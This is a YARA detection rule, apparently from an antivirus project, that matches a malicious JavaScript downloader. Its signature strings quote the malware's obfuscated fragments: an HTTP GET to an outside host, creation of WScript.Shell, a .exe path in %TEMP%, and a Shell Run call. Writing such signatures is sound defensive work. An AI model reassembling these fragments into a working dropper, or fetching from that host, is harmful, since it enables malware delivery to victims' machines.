rule sig_20160401_50df1628ba4ece54893e38f0c1a457a4 {
  meta:
    description = "datamaliciousorder - file 20160401_50df1628ba4ece54893e38f0c1a457a4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2f2d2f2962bd10a54a97d0cded73dcdb80f33664a6aa82fd2b7daec6caa50f99"

  strings:
    $s1  = "TaCow[YpNz](\"G\" + \"ET\", \"http://ecomputercenter.com/d9sla\", false);" fullword ascii
    $s2  = "var ZlOpk = function KosOgt() {return WScript[YncPv](\"WScript\"+\".Shell\");}(), EaHy = 11;" fullword ascii
    $s3  = "function UxPrp(GeKsa, GctYoy){NsnWv = NsnWv * 1; return GeKsa - GctYoy;};" fullword ascii
    $s4  = "if (TaCow[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function GpvHb(){return SzxXav + \"\";};" fullword ascii
    $s6  = "function AwoUjq() {return ZlOpk[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"0KttjliWVLDq.ex\" + \"e\";};" fullword ascii
    $s7  = "function KvCq() {return ((TozRvg == true) && (TozRvg == CvSd)) ? 1 : NsnWv;};" fullword ascii
    $s8  = "function MnIst(IsLqg) {var OxHza = (1, 2, 3, 4, 5, IsLqg); return OxHza;};" fullword ascii
    $s9  = "}while (VdNfi);" fullword ascii
    $s10 = "TozRvg = true; " fullword ascii
    $s11 = "var TozRvg = false;" fullword ascii
    $s12 = "return UxPrp(YpZde, PdHl);" fullword ascii
    $s13 = "function AflGm()" fullword ascii
    $s14 = "function GzrIww(){return 23;};" fullword ascii
    $s15 = "var OajHj = new this[\"Date\"]();" fullword ascii
    $s16 = "var AsSd = false;" fullword ascii
    $s17 = "CvSd = true; " fullword ascii
    $s18 = "function XsrHb(){return YncPv;};" fullword ascii
    $s19 = "var CvSd = false;" fullword ascii
    $s20 = "function QrEpf(XgcWl){ZlOpk[\"R\"+\"un\"](XgcWl, NsnWv, NsnWv);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}